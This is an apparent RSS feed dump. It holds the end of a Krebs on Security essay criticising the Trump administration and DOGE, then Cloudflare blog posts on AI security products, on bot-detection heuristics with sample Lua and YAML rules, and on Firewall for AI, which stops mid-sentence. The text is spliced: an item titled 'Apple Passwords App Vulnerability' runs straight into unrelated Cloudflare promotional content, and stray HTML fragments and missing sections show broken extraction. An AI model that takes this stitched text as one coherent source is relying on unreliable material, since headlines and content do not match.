&lt;p&gt;When the head of the FBI is promising to turn his own agency headquarters into a mocking public exhibit on the U.S. National Mall, it may seem silly to fuss over the White House&amp;#8217;s clumsy and insulting instructions to former employees they unlawfully fired.&lt;/p&gt;
&lt;p&gt;Indeed, one consistent feedback I&amp;#8217;ve heard from a subset of readers here is something to this effect: &amp;#8220;I used to like reading your stuff more when you weren&amp;#8217;t writing about politics all the time.&amp;#8221;&lt;/p&gt;
&lt;p&gt;My response to that is: &amp;#8220;Yeah, me too.&amp;#8221; It&amp;#8217;s not that I&amp;#8217;m suddenly interested in writing about political matters; it&amp;#8217;s that various actions by this administration keep intruding on my areas of coverage.&lt;/p&gt;
&lt;p&gt;A less charitable interpretation of that reader comment is that anyone still giving such feedback is either dangerously uninformed, being disingenuous, or just doesn’t want to keep being reminded that they’re on the side of the villains, despite all the evidence showing it.&lt;/p&gt;
&lt;p&gt;Article II of the U.S. Constitution unambiguously states that the president shall take care that the laws be faithfully executed. But almost from Day One of his second term, Mr. Trump has been acting in violation of his sworn duty as president by choosing not to enforce laws passed by Congress (TikTok ban, anyone?), by freezing funds already allocated by Congress, and most recently by flouting a federal court order while simultaneously &lt;a href="https://www.nytimes.com/2025/03/19/us/politics/trump-deportations-constitutional-crisis-impeachment.html" rel="noopener" target="_blank"&gt;calling for the impeachment of the judge who issued it&lt;/a&gt;. Sworn to uphold, protect and defend The Constitution, President Trump appears to be creating new constitutional challenges with almost each passing day.&lt;/p&gt;
&lt;p&gt;When Mr. Trump was voted out of office in November 2020, he turned to baseless claims of widespread &amp;#8220;election fraud&amp;#8221; to explain his loss &amp;#8212; with deadly and long-lasting consequences. This time around, the rallying cry of DOGE and White House is &amp;#8220;government fraud,&amp;#8221; which gives the administration a certain amount of cover for its actions among a base of voters that has long sought to shrink the size and cost of government.&lt;/p&gt;
&lt;p&gt;In reality, &amp;#8220;government fraud&amp;#8221; has become a term of derision and public scorn applied to anything or anyone the current administration doesn&amp;#8217;t like. If DOGE and the White House were truly interested in trimming government waste, fraud and abuse, they could scarcely do better than consult the inspectors general fighting it at various federal agencies.&lt;/p&gt;
&lt;p&gt;After all, the inspectors general likely know exactly where a great deal of the federal government&amp;#8217;s fiscal skeletons are buried. Instead, Mr. Trump &lt;a href="https://www.cbsnews.com/news/trump-firings-watchdogs-inspectors-general-60-minutes/" rel="noopener" target="_blank"&gt;fired at least 17 inspectors general&lt;/a&gt;, leaving the government without critical oversight of agency activities. That action is unlikely to stem government fraud; if anything, it will only encourage such activity.&lt;/p&gt;
&lt;p&gt;As &lt;em&gt;Techdirt&lt;/em&gt; founder &lt;strong&gt;Mike Masnick&lt;/strong&gt; noted in a recent column &amp;#8220;&lt;a href="https://www.techdirt.com/2025/03/04/why-techdirt-is-now-a-democracy-blog-whether-we-like-it-or-not/" rel="noopener" target="_blank"&gt;Why Techdirt is Now a Democracy Blog (Whether We Like it or Not)&lt;/a&gt;,&amp;#8221; when the very institutions that made American innovation possible are being systematically dismantled, it’s not a &amp;#8220;political&amp;#8221; story anymore: It’s a story about whether the environment that enabled all the other stories we cover will continue to exist.&lt;/p&gt;
&lt;p&gt;&amp;#8220;This is why tech journalism’s perspective is so crucial right now,&amp;#8221; Masnick wrote. &amp;#8220;We’ve spent decades documenting how technology and entrepreneurship can either strengthen or undermine democratic institutions. We understand the dangers of concentrated power in the digital age. And we’ve watched in real-time as tech leaders who once championed innovation and openness now actively work to consolidate control and dismantle the very systems that enabled their success.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&amp;#8220;But right now, the story that matters most is how the dismantling of American institutions threatens everything else we cover,&amp;#8221; Masnick continued. &amp;#8220;When the fundamental structures that enable innovation, protect civil liberties, and foster open dialogue are under attack, every other tech policy story becomes secondary.&amp;#8221;&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=70729</guid><category>A Little Sunshine</category><category>DOGE</category><category>The Coming Storm</category><category>Central Intelligence Agency</category><category>Christopher Stanley</category><category>Fannie Mae</category><category>Hunter Strategy</category><category>Jake Williams</category><category>Kash Patel</category><category>Mike Masnick</category><category>national security agency</category><category>NBC News</category><category>Rob Joyce</category><category>Shane Harris</category><category>Starlink</category><category>Techdirt</category><category>The Atlantic</category><category>The New York Times</category><category>U.S. Citizenship and Immigration Services</category><category>U.S. Cybersecurity &amp; Infrastructure Security Agency</category></item><item><title>Apple Passwords App Vulnerability Exposed Users for Months</title><link>https://www.techrepublic.com/article/apple-password-app-exposed-2025/</link><description>Apple’s Passwords app had a security flaw that exposed users to phishing attacks for months.

Customers are also using &lt;a href="https://www.cloudflare.com/developer-platform/products/r2/"&gt;&lt;u&gt;Cloudflare’s R2&lt;/u&gt;&lt;/a&gt; to store their AI training data with zero egress fees, in order to develop the next-gen AI models. &lt;/p&gt;&lt;p&gt;We are continually investing in not only our serverless AI inference infrastructure across the globe, but also in making Cloudflare the best place to &lt;a href="https://blog.cloudflare.com/build-ai-agents-on-cloudflare/"&gt;&lt;u&gt;build AI Agents&lt;/u&gt;&lt;/a&gt;. Cloudflare’s composable AI architecture has all the primitives that enable AI applications to have real time communications, persist state, execute long-running tasks, and repeat them on a schedule. &lt;/p&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;b&gt;Protect and control&lt;/b&gt;: Once your application is deployed, be it directly on Cloudflare, using Workers AI, or running on your own infrastructure (cloud or on premise), Cloudflare’s &lt;a href="https://developers.cloudflare.com/ai-gateway/"&gt;&lt;u&gt;AI Gateway&lt;/u&gt;&lt;/a&gt; lets you gain visibility into the cost, usage, latency, and overall performance of the application.&lt;/p&gt;&lt;p&gt;Additionally, &lt;a href="https://blog.cloudflare.com/take-control-of-public-ai-application-security-with-cloudflare-firewall-for-ai/"&gt;&lt;u&gt;Firewall for AI&lt;/u&gt;&lt;/a&gt; lets you layer security on top by automatically ensuring every prompt is clean from injection, and that personally identifiable information (PII) is neither submitted to nor (coming soon) extracted from, the application.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/4dDiUMSKDoqyrPgzjiHfkx/22a2a9e159f8efcbf2b2a43f9bdf2a9b/3.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;For security teams&lt;/h3&gt;

            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Security teams have a growing new challenge: ensure AI applications are used securely, both in regard to internal usage by employees, as well as by users of externally-facing AI applications the business is responsible for. Ensuring PII data is handled correctly is also a growing major concern for CISOs.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Discover applications: &lt;/b&gt;You can’t protect what you don’t know about. Firewall for AI’s discovery capability lets security teams find AI applications that are being used within the organization without the need to perform extensive surveys.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Control PII flow and access: &lt;/b&gt;Once discovered, via Firewall for AI or other means, security teams can leverage &lt;a href="https://www.cloudflare.com/learning/access-management/what-is-ztna/"&gt;&lt;u&gt;Zero Trust Network Access (ZTNA)&lt;/u&gt;&lt;/a&gt; to ensure only authorized employees are accessing the correct applications. Additionally, using Firewall for AI, they can ensure that, even if authorised, neither employees nor potentially external users, are submitting or extracting personally identifiable information (PII) to/from the application.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Protect against exploits: &lt;/b&gt;Malicious users are targeting AI applications with novel attack vectors, as these applications are often connected to internal data stores. With Firewall for AI and the broader Application Security portfolio, you can protect against a wide number of exploits highlighted in the &lt;a href="https://genai.owasp.org/resource/owasp-top-10-for-llm-applications-2025/"&gt;&lt;u&gt;OWASP Top 10 for LLM applications&lt;/u&gt;&lt;/a&gt;, including, but not limited to, prompt injection, sensitive information disclosure, and improper output handling.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Safeguarding conversations: &lt;/b&gt;With &lt;a href="https://blog.cloudflare.com/guardrails-in-ai-gateway/"&gt;&lt;u&gt;Llama Guard&lt;/u&gt;&lt;/a&gt; integrated into both AI Gateway and Firewall for AI, you can ensure both input and output of your AI application is not toxic, and follows topic and sentiment rules based on your internal business policies.&lt;/p&gt;

            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The advent of AI is arguably putting content creators at risk, with sophisticated LLM models now generating both text, images, and videos of high quality. &lt;a href="https://blog.cloudflare.com/declaring-your-aindependence-block-ai-bots-scrapers-and-crawlers-with-a-single-click/"&gt;&lt;u&gt;We’ve blogged in the past about AI Independence, our approach to safeguarding content creators&lt;/u&gt;&lt;/a&gt;, for both individuals and businesses. If you fall in this category, we have the right tools for you too.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Observe who is accessing your content:&lt;/b&gt; With our &lt;a href="https://blog.cloudflare.com/cloudflare-ai-audit-control-ai-content-crawlers/"&gt;&lt;u&gt;AI Audit dashboard&lt;/u&gt;&lt;/a&gt;, you gain visibility (who, what, where and when) into the AI platforms crawling your site to retrieve content to use for AI training data. We are constantly classifying and adding new vendors as they create new crawlers.&lt;/p&gt;
          &lt;figure&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;b&gt;Block access: &lt;/b&gt;If AI crawlers do not follow robots.txt or other relevant standards, or are potentially unwanted, you can block access outright. We’ve &lt;a href="https://blog.cloudflare.com/declaring-your-aindependence-block-ai-bots-scrapers-and-crawlers-with-a-single-click/"&gt;&lt;u&gt;provided a simple “one click” button&lt;/u&gt;&lt;/a&gt; for customers using Cloudflare on our self-serve plans to protect their website. Larger organizations can build fine tune rules using our &lt;a href="https://www.cloudflare.com/en-gb/application-services/products/bot-management/"&gt;&lt;u&gt;Bot Management&lt;/u&gt;&lt;/a&gt; solution allowing them to target individual bots and create custom filters with ease.&lt;/p&gt;

These are called heuristics. Our Bot Management heuristics engine has served as an important part of eight global &lt;a href="https://developers.cloudflare.com/bots/concepts/bot-score/#machine-learning"&gt;&lt;u&gt;machine learning (ML) models&lt;/u&gt;&lt;/a&gt;, but we needed a more expressive engine to increase our accuracy. In this post, we’ll review how we solved this by moving our heuristics to the Cloudflare &lt;a href="https://developers.cloudflare.com/ruleset-engine/"&gt;&lt;u&gt;Ruleset Engine&lt;/u&gt;&lt;/a&gt;. Not only did this provide the platform we needed to write more nuanced rules, it made our platform simpler and safer, and provided &lt;a href="https://www.cloudflare.com/application-services/products/bot-management/"&gt;&lt;u&gt;Bot Management&lt;/u&gt;&lt;/a&gt; customers more flexibility and visibility into their bot traffic.   &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Bot detection via simple heuristics&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#bot-detection-via-simple-heuristics"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;In Cloudflare’s bot detection, we build heuristics from attributes like software library fingerprints, HTTP request characteristics, and internal threat intelligence. Heuristics serve three separate purposes for bot detection: &lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;Bot identification: If traffic matches a heuristic, we can identify the traffic as definitely automated traffic (with a &lt;a href="https://developers.cloudflare.com/bots/concepts/bot-score/"&gt;&lt;u&gt;bot score&lt;/u&gt;&lt;/a&gt; of 1) without the need of a machine learning model. &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Train ML models: When traffic matches our heuristics, we create labelled datasets of bot traffic to train new models. We’ll use many different sources of labelled bot traffic to train a new model, but our heuristics datasets are one of the highest confidence datasets available to us.   &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Validate models: We benchmark any new model candidate’s performance against our heuristic detections (among many other checks) to make sure it meets a required level of accuracy.&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;While the existing heuristics engine has worked very well for us, as bots evolved we needed the flexibility to write increasingly complex rules. Unfortunately, such rules were not easily supported in the old engine. Customers have also been asking for more details about which specific heuristic caught a request, and for the flexibility to enforce different policies per heuristic ID.  We found that by building a new heuristics framework integrated into the Cloudflare Ruleset Engine, we could build a more flexible system to write rules and give Bot Management customers the granular explainability and control they were asking for. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;The need for more efficient, precise rules&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-need-for-more-efficient-precise-rules"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;In our previous heuristics engine, we wrote rules in &lt;a href="https://www.lua.org/"&gt;&lt;u&gt;Lua&lt;/u&gt;&lt;/a&gt; as part of our &lt;a href="https://openresty.org/"&gt;&lt;u&gt;openresty&lt;/u&gt;&lt;/a&gt;-based reverse proxy. The Lua-based engine was limited to a very small number of characteristics in a rule because of the high engineering cost we observed with adding more complexity.&lt;/p&gt;&lt;p&gt;With Lua, we would write fairly simple logic to match on specific characteristics of a request (i.e. user agent). Creating new heuristics of an existing class was fairly straight forward. All we’d need to do is define another instance of the existing class in our database. However, if we observed malicious traffic that required more than two characteristics (as a simple example, user-agent and &lt;a href="https://en.wikipedia.org/wiki/Autonomous_system_(Internet)"&gt;&lt;u&gt;ASN&lt;/u&gt;&lt;/a&gt;) to identify, we’d need to create bespoke logic for detections. Because our Lua heuristics engine was bundled with the code that ran ML models and other important logic, all changes had to go through the same review and release process. If we identified malicious traffic that needed a new heuristic class, and we were also blocked by pending changes in the codebase, we’d be forced to either wait or rollback the changes. If we’re writing a new rule for an “under attack” scenario, every extra minute it takes to deploy a new rule can mean an unacceptable impact to our customer’s business. &lt;/p&gt;&lt;p&gt;More critical than time to deploy is the complexity that the heuristics engine supports. The old heuristics engine only supported using specific request attributes when creating a new rule. As bots became more sophisticated, we found we had to reject an increasing number of new heuristic candidates because we weren’t able to write precise enough rules. For example, we found a &lt;a href="https://go.dev/"&gt;&lt;u&gt;Golang&lt;/u&gt;&lt;/a&gt; TLS fingerprint frequently used by bots and by a small number of corporate VPNs. We couldn’t block the bots without also stopping the legitimate VPN usage as well, because the old heuristics platform lacked the flexibility to quickly compile sufficiently nuanced rules. Luckily, we already had the perfect solution with Cloudflare Ruleset Engine. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Our new heuristics engine&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#our-new-heuristics-engine"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The Ruleset Engine is familiar to anyone who has written a WAF rule, Load Balancing rule, or Transform rule, &lt;a href="https://blog.cloudflare.com/announcing-firewall-rules/"&gt;&lt;u&gt;just to name a few&lt;/u&gt;&lt;/a&gt;. For Bot Management, the Wireshark-inspired syntax allows us to quickly write heuristics with much greater flexibility to vastly improve accuracy. We can write a rule in &lt;a href="https://yaml.org/"&gt;&lt;u&gt;YAML&lt;/u&gt;&lt;/a&gt; that includes arbitrary sub-conditions and inherit the same framework the WAF team uses to both ensure any new rule undergoes a rigorous testing process with the ability to rapidly release new rules to stop attacks in real-time. &lt;/p&gt;&lt;p&gt;Writing heuristics on the Cloudflare Ruleset Engine allows our engineers and analysts to write new rules in an easy to understand YAML syntax. This is critical to supporting a rapid response in under attack scenarios, especially as we support greater rule complexity. Here’s a simple rule using the new engine, to detect empty user-agents restricted to a specific JA4 fingerprint (right), compared to the empty user-agent detection in the old Lua based system (left): &lt;/p&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;p&gt;&lt;b&gt;Old&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;td&gt;&lt;p&gt;&lt;b&gt;New&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;p&gt;&lt;code&gt;local _M = {}&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;local EmptyUserAgentHeuristic = {&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;   heuristic = {},&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;}&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;EmptyUserAgentHeuristic.__index = EmptyUserAgentHeuristic&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;--- Creates and returns empty user agent heuristic&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;-- @param params table contains parameters injected into EmptyUserAgentHeuristic&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;-- @return EmptyUserAgentHeuristic table&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;function _M.new(params)&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;   return setmetatable(params, EmptyUserAgentHeuristic)&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;end&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;--- Adds heuristic to be used for inference in `detect` method&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;-- @param heuristic schema.Heuristic table&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;function EmptyUserAgentHeuristic:add(heuristic)&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;   self.heuristic = heuristic&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;end&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;--- Detect runs empty user agent heuristic detection&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;-- @param ctx context of request&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;-- @return schema.Heuristic table on successful detection or nil otherwise&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;function EmptyUserAgentHeuristic:detect(ctx)&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;   local ua = ctx.user_agent&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;   if not ua or ua == '' then&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;      return self.heuristic&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;   end&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;end&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;return _M&lt;/code&gt;&lt;/p&gt;&lt;/td&gt;&lt;td&gt;&lt;p&gt;&lt;code&gt;ref: empty-user-agent&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;      description: Empty or missing &lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;User-Agent header&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;      action: add_bot_detection&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;      action_parameters:&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;        active_mode: false&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;      expression: http.user_agent eq &lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;"" and cf.bot_management.ja4 = "t13d1516h2_8daaf6152771_b186095e22b6"&lt;/code&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;The Golang heuristic that captured corporate proxy traffic as well (mentioned above) was one of the first to migrate to the new Ruleset engine. Before the migration, traffic matching on this heuristic had a false positive rate of 0.01%. While that sounds like a very small number, this means for every million bots we block, 100 real users saw a Cloudflare challenge page unnecessarily. At Cloudflare scale, even small issues can have real, negative impact.&lt;/p&gt;&lt;p&gt;When we analyzed the traffic caught by this heuristic rule in depth, we saw the vast majority of attack traffic came from a small number of abusive networks. After narrowing the definition of the heuristic to flag the Golang fingerprint only when it’s sourced by the abusive networks, the rule now has a false positive rate of 0.0001% (One out of 1 million).  Updating the heuristic to include the network context improved our accuracy, while still blocking millions of bots every week and giving us plenty of training data for our bot detection models. Because this heuristic is now more accurate, newer ML models make more accurate decisions on what’s a bot and what isn’t.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;New visibility and flexibility for Bot Management customers &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#new-visibility-and-flexibility-for-bot-management-customers"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;While the new heuristics engine provides more accurate detections for all customers and a better experience for our analysts, moving to the Cloudflare Ruleset Engine also allows us to deliver new functionality for Enterprise Bot Management customers, specifically by offering more visibility. This new visibility is via a new field for Bot Management customers called Bot Detection IDs. Every heuristic we use includes a unique Bot Detection ID. These are visible to Bot Management customers in analytics, logs, and firewall events, and they can be used in the firewall to write precise rules for individual bots. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3cYXHw8tFUjdJQGm93gFcE/0a3f6ab89a70410ebb7dd2c6f4f3a677/1.png" /&gt;
          &lt;/figure&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/9d7L1r7yN9AEhO26H7SgQ/434f0f934dd4f4498a8d13e85a7660ae/2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;Detections also include a specific tag describing the class of heuristic. Customers see these plotted over time in their analytics. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2UlkGQ070UWsmU76IXYqDd/6bca8f28959a8fe8f3013792a17b348a/image4.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;To illustrate how this data can help give customers visibility into why we blocked a request, here’s an example request flagged by Bot Management (with the IP address, ASN, and country changed):&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3i6k9ejsBVwlbXUrZFIFJG/4c9cddd11d9f7a8ddf10eb5ff30a027b/4.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;Before, just seeing that our heuristics gave the request a score of 1 was not very helpful in understanding why it was flagged as a bot. Adding our Detection IDs to Firewall Events helps to paint a better picture for customers that we’ve identified this request as a bot because that traffic used an empty user-agent. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5UQd20VnXCnIav1skHiX6i/18e0cf01106601ae7faf18be50d43365/5.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;In addition to Analytics and Firewall Events, Bot Detection IDs are now available for Bot Management customers to use in Custom Rules, Rate Limiting Rules, Transform Rules, and Workers. &lt;/p&gt;&lt;h4&gt;Account takeover detection IDs&lt;/h4&gt;&lt;p&gt;One way we’re focused on improving Bot Management for our customers is by surfacing more attack-specific detections. During Birthday Week, we &lt;a href="https://blog.cloudflare.com/a-safer-internet-with-cloudflare/"&gt;&lt;u&gt;launched Leaked Credentials Check&lt;/u&gt;&lt;/a&gt; for all customers so that security teams could help &lt;a href="https://www.cloudflare.com/zero-trust/solutions/account-takeover-prevention/"&gt;&lt;u&gt;prevent account takeover (ATO) attacks&lt;/u&gt;&lt;/a&gt; by identifying accounts at risk due to leaked credentials. We’ve now added two more detections that can help Bot Management enterprise customers identify suspicious login activity via specific &lt;a href="https://developers.cloudflare.com/bots/concepts/detection-ids/#account-takeover-detections"&gt;&lt;u&gt;detection IDs&lt;/u&gt;&lt;/a&gt; that monitor login attempts and failures on the zone. These detection IDs are not currently affecting the bot score, but will begin to later in 2025. Already, they can help many customers detect more account takeover events now.&lt;/p&gt;&lt;p&gt;Detection ID &lt;b&gt;201326592 &lt;/b&gt;monitors traffic on a customer website and looks for an anomalous rise in login failures (usually associated with brute force attacks), and ID &lt;b&gt;201326593 &lt;/b&gt;looks for an anomalous rise in login attempts (usually associated with credential stuffing). &lt;/p&gt;

        &lt;p&gt;If you are a Bot Management customer, log in and head over to the Cloudflare dashboard and take a look in Security Analytics for bot detection IDs &lt;code&gt;201326592&lt;/code&gt; and &lt;code&gt;201326593&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;These will highlight ATO attempts targeting your site. If you spot anything suspicious, or would like to be protected against future attacks, create a rule that uses these detections to keep your application safe.&lt;/p&gt;</content:encoded><guid isPermaLink="false">4IkgXzyemEEsN7A6Cd18hb</guid><category>Security Week</category><category>Bots</category><category>Bot Management</category><category>Application Security</category><category>Machine Learning</category><category>Heuristics</category><category>Edge Rules</category><category>Security</category></item><item><title>Take control of public AI application security with Cloudflare's Firewall for AI</title><link>https://blog.cloudflare.com/take-control-of-public-ai-application-security-with-cloudflare-firewall-for-ai/</link><description>Firewall for AI discovers and protects your public LLM-powered applications, and is seamlessly integrated with Cloudflare WAF. Join the beta now and take control of your generative AI security.</description><content:encoded>&lt;p&gt;Imagine building an LLM-powered assistant trained on your developer documentation and some internal guides to quickly help customers, reduce support workload, and improve user experience. Sounds great, right? But what if sensitive data, such as employee details or internal discussions, is included in the data used to train the LLM? Attackers could manipulate the assistant into exposing sensitive data or exploit it for social engineering attacks, where they deceive individuals or systems into revealing confidential details, or use it for targeted phishing attacks. Suddenly, your helpful AI tool turns into a serious security liability. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Introducing Firewall for AI: the easiest way to discover and protect LLM-powered apps&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#introducing-firewall-for-ai-the-easiest-way-to-discover-and-protect-llm-powered-apps"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Today, as part of Security Week 2025, we’re announcing the open beta of Firewall for AI, first &lt;a href="https://blog.cloudflare.com/firewall-for-ai/"&gt;&lt;u&gt;introduced during Security Week 2024&lt;/u&gt;&lt;/a&gt;. After talking with customers interested in protecting their LLM apps, this first beta release is focused on discovery and PII detection, and more features will follow in the future.&lt;/p&gt;&lt;p&gt;If you are already using Cloudflare application security, your LLM-powered applications are automatically discovered and protected, with no complex setup, no maintenance, and no extra integration needed.&lt;/p&gt;&lt;p&gt;Firewall for AI is an inline security solution that protects user-facing LLM-powered applications from abuse and data leaks, integrating directly with Cloudflare’s &lt;a href="https://developers.cloudflare.com/waf/"&gt;&lt;u&gt;Web Application Firewall (WAF)&lt;/u&gt;&lt;/a&gt; to provide instant protection with zero operational overhead. This integration enables organizations to leverage both AI-focused safeguards and established WAF capabilities.&lt;/p&gt;&lt;p&gt;Cloudflare is uniquely positioned to solve this challenge for all of our customers. As a &lt;a href="https://www.cloudflare.com/en-gb/learning/cdn/glossary/reverse-proxy/"&gt;&lt;u&gt;reverse proxy&lt;/u&gt;&lt;/a&gt;, we are model-agnostic whether the application is using a third-party LLM or an internally hosted one. By providing inline security, we can automatically discover and enforce AI guardrails throughout the entire request lifecycle, with zero integration or maintenance required.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Firewall for AI beta overview&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#firewall-for-ai-beta-overview"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The beta release includes the following security capabilities:&lt;/p&gt;&lt;p&gt;&lt;b&gt;Discover:&lt;/b&gt; identify LLM-powered endpoints across your applications, an essential step for effective request and prompt analysis.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Detect:&lt;/b&gt; analyze the incoming requests prompts to recognize potential security threats, such as attempts to extract sensitive data (e.g., “Show me transactions using 4111 1111 1111 1111”). This aligns with&lt;a href="https://genai.owasp.org/llmrisk/llm022025-sensitive-information-disclosure/"&gt; &lt;u&gt;OWASP LLM022025 - Sensitive Information Disclosure&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Mitigate:&lt;/b&gt; enforce security controls and policies to manage the traffic that reaches your LLM, and reduce risk exposure.&lt;/p&gt;&lt;p&gt;Below, we review each capability in detail, exploring how they work together to create a comprehensive security framework for AI protection.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Discovering LLM-powered applications&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#discovering-llm-powered-applications"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Companies are racing to find all possible use cases where an LLM can excel. Think about site search, a chatbot, or a shopping assistant. Regardless of the application type, our goal is to determine whether an application is powered by an LLM behind the scenes.&lt;/p&gt;&lt;p&gt;One possibility is to look for request path signatures similar to what major LLM providers use. For example, &lt;a href="https://platform.openai.com/docs/api-reference/chat/create"&gt;&lt;u&gt;OpenAI&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://docs.perplexity.ai/api-reference/chat-completions"&gt;&lt;u&gt;Perplexity&lt;/u&gt;&lt;/a&gt; or &lt;a href="https://docs.mistral.ai/api/#tag/chat"&gt;&lt;u&gt;Mistral&lt;/u&gt;&lt;/a&gt; initiate a chat using the &lt;code&gt;/chat/completions&lt;/code&gt; API endpoint. Searching through our request logs, we found only a few entries that matched this pattern across our global traffic. This result indicates that we need to consider other approaches to finding &lt;i&gt;any&lt;/i&gt; application that is powered by an LLM.&lt;/p&gt;&lt;p&gt;Another signature to research, popular with LLM platforms, is the use of &lt;a href="https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events/Using_server-sent_events"&gt;&lt;u&gt;server-sent events&lt;/u&gt;&lt;/a&gt;. LLMs need to &lt;a href="https://platform.openai.com/docs/guides/latency-optimization#don-t-default-to-an-llm"&gt;&lt;u&gt;“think”&lt;/u&gt;&lt;/a&gt;. &lt;a href="https://platform.openai.com/docs/api-reference/streaming"&gt;&lt;u&gt;Using server-sent events&lt;/u&gt;&lt;/a&gt; improves the end user’s experience by sending over each &lt;a href="https://help.openai.com/en/articles/4936856-what-are-tokens-and-how-to-count-them"&gt;&lt;u&gt;token&lt;/u&gt;&lt;/a&gt; as soon as it is ready, creating the perception that an LLM is “thinking” like a human being. Matching on requests of server-sent events is straightforward using the response header content type of &lt;code&gt;text/event-stream&lt;/code&gt;. This approach expands the 